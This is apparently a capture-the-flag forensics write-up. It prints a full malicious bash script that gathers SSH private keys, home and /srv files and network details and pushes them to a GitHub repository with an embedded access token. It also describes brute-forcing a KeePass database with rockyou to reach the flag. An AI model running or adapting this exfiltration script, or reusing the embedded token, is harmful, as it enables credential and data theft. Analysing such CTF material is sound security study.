Hi, here is a writeup about the Bombardino Forensics chall, 

So downloading the dist we get a linux file system.

![alt text](image-8.png)
The challenge desc said something about a file named  `scriptiono`, so locating it with locate tool will reveal its path, 
![alt text](image.png)

`/home/sn4keey3s/Downloads/INPT-CTF/usr/lib/tools/Bombardino_scriptino.sh` content :

```bash
#!/bin/bash

TEMP_DIR=$(mktemp -d)
cd "$TEMP_DIR"

mkdir $TEMP_DIR/ssh-exfil

	rsync -a --prune-empty-dirs --include '*/' --include 'id_*' --include 'known_hosts' --exclude '*' /home ./ssh-exfil


	for i in $(find . -name ".ssh" -type d)
		do
			cd $i
			cd ./..
			mv .ssh ssh
			cd ./..
			cd ./..
	done

cd $TEMP_DIR
tar cfv $TEMP_DIR/ssh-exfil.tar $TEMP_DIR/ssh-exfil/

touch ./work.log

{
	echo "Starting data collection for exfiltration..."
	
	echo ""
	
	fqn=$(host -TtA $(hostname -s)|grep "has address"|awk '{print $1}') ; \
	if [[ "${fqn}" == "" ]] ; then fqn=$(hostname -s) ; fi ; \
	echo "${fqn}"

	whoami

	ip link && ip neigh && ip route && ip rule && ip maddress && ip address

} 2>&1 | tee -a ./work.log

cd $TEMP_DIR
echo $(pwd)
git init
git config --global user.email "jantofixsamaqlo@gmail.com"
git config --global user.name "jantofix12"


BRANCH_NAME="exfil-$(date +%s)"
git checkout -b "$BRANCH_NAME"


mkdir $TEMP_DIR/srv_files


cp -r /srv/* $TEMP_DIR/srv_files
cp -r /home/* $TEMP_DIR/srv_files

tar cfv $TEMP_DIR/srv_files.tar $TEMP_DIR/srv_files/
git add ssh-exfil.tar work.log srv_files.tar


git commit -m "Exfiltrated data from $(hostname) at $(date)"

git remote add origin https://jantofix12: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@github.com/jantofix12/samaqlino_forensicino_bombardini.git

git push -u origin "$BRANCH_NAME"

cd - > /dev/null
rm -rf "$TEMP_DIR"


exit

```

This script is malicious in nature, it performs data exfiltration and uploads sensitive files to a remote GitHub repository. `github.com/jantofix12/samaqlino_forensicino_bombardini.git`

Lets clone it, 

![alt text](image-1.png)

as we see this commit is about a simple website that is not uploaded by the malware( some fishy things by `@samaqlo` bach y9olabna ),
in the malware src code, we see that the each commit it's in a branch named after the timestamp of it , `BRANCH_NAME="exfil-$(date +%s)"`, so we can get the old commit by the malware to check the uploaded files.

![alt text](image-2.png)

Ohh, a lot of interesting branches, after searching a bit in the branches, you'll get this interesting one `exfil-1744466130`. use checkout to jumt to it.

![alt text](image-3.png)

So we found the `srv_files.tar` exfiltrated by the malware, untar it we have some serious files like `secret.zip` that contains the flag, but it is locked and a .kdbx file which is a pass-protected database for KeePass Manager that stores protected passwords. so the idea is easy, we should crack the db to get the passwords to unzip the flag from `secret.zip`.

So how to crack this shit, simply some osint on tools for cracking KeePass, i found this one :
![alt text](image-4.png)

but this is where my nightmare begins, the script doesn't work on `pop os` or `ubuntu`, only works on `kali linux`, but i think the prob is with the dependency that the cracking process is rellying on which is `keepassxc`. it might have diff internal implementations or diff other dependencies on the diff OSs, that's what i think,

So after using the command `./keepass4brute/keepass4brute.sh secret_vault.kdbx rockyou.txt` on my collegue's KALI machine, cracked it : `pass = iloveyou1`

now lets open the db with this password, 

![alt text](image-5.png)

And boooom.

![alt text](image-6.png)

you found 4 passwords, try each to open the zip file,

![alt text](image-7.png)

Pass = `ArvmZbUrXzqt3dr`

Flag = `IDEH{bombardino_scriptino_left_no_log_in_the_loggino}`

Thanks for this chall, it was good, but i think the Kali Machine prb should be mentioned.
